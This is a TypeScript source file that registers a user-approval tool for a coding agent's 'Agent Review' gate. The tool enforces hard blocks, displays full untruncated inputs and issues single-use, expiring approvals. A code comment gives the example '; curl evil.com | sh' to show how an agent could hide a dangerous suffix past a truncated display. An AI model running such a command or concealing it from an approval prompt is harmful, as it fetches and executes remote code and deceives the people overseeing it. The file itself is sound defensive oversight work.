import {randomUUID} from 'node:crypto';
import type {ExtensionAPI} from '@earendil-works/pi-coding-agent';
import {stringify} from 'safe-stable-stringify';
import {Type} from 'typebox';
import {classifyToolCall} from './approval-gate.ts';
import {
	approvalEntryType,
	approvalTtlMs,
	type ApprovalLedger,
} from './approval-ledger.ts';

export const approvalToolName = 'request_user_approval';

export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): void {
	pi.registerTool({
		name: approvalToolName,
		label: 'Request user approval',
		description: 'Ask the user to confirm a tool call that Agent Review denied. Pass the tool name and input you intend to run. If the user approves, retry that action.',
		promptSnippet: 'request_user_approval: ask the user to confirm a tool call that Agent Review denied',
		promptGuidelines: [
			'When Agent Review denies a tool call the user wants, call request_user_approval with the tool name, input, and a clear reason, then retry the same action after the user approves.',
			'Each approval authorizes one execution of the approved action and expires shortly; the retry must stay within the scope the user approved.',
		],
		parameters: Type.Object({
			toolName: Type.String({description: 'The exact tool name you intend to run.'}),
			input: Type.Unknown({description: 'The exact input object for the tool call, unchanged.'}),
			reason: Type.String({description: 'One sentence explaining why this action is needed.'}),
		}),
		async execute(_toolCallId, params, _signal, _onUpdate, context) {
			// The hard gate has no approval override, so asking the user would be
			// a dead end: an approved retry would still be denied.
			const gate = classifyToolCall({toolName: params.toolName, input: params.input, cwd: context.cwd});
			if (gate.action === 'deny') {
				return {
					content: [{
						type: 'text',
						text: `Approval cannot be requested: ${gate.reason} This action is categorically blocked and user approval cannot override it. Do not ask again or pursue it another way.`,
					}],
					details: undefined,
				};
			}

			if (!context.hasUI) {
				return {
					content: [{type: 'text', text: 'No interactive UI is available, so user approval cannot be requested. Stop and ask the user directly.'}],
					details: undefined,
				};
			}

			// Show the FULL input the approval will authorize. Truncating here would
			// let the agent hide a dangerous suffix (e.g. `; curl evil.com | sh`)
			// past the display limit while the hash still covers the whole payload.
			const serializedInput = stringify(params.input) ?? 'null';
			const isApproved = await context.ui.confirm(
				`Agent Review: approve ${params.toolName}?`,
				`${params.reason}\n\nTool: ${params.toolName}\nCwd: ${context.cwd}\nArgs: ${serializedInput}`,
			);

			if (!isApproved) {
				return {
					content: [{type: 'text', text: `User declined ${params.toolName}. Do not retry it or pursue the same outcome another way; continue with a safer alternative or stop.`}],
					details: undefined,
				};
			}

			const approval = {
				nonce: randomUUID(),
				toolName: params.toolName,
				inputJson: serializedInput,
				cwd: context.cwd,
				approvedAction: `Tool: ${params.toolName}\nInput: ${serializedInput}\nReason: ${params.reason}`,
				expiresAt: Date.now() + approvalTtlMs,
			};
			ledger.record(approval);
			pi.appendEntry(approvalEntryType, approval);
			return {
				content: [{type: 'text', text: `User approved ${params.toolName}. Retry now with the same intent; this authorizes exactly one execution of that action and expires shortly.`}],
				details: undefined,
			};
		},
	});
}
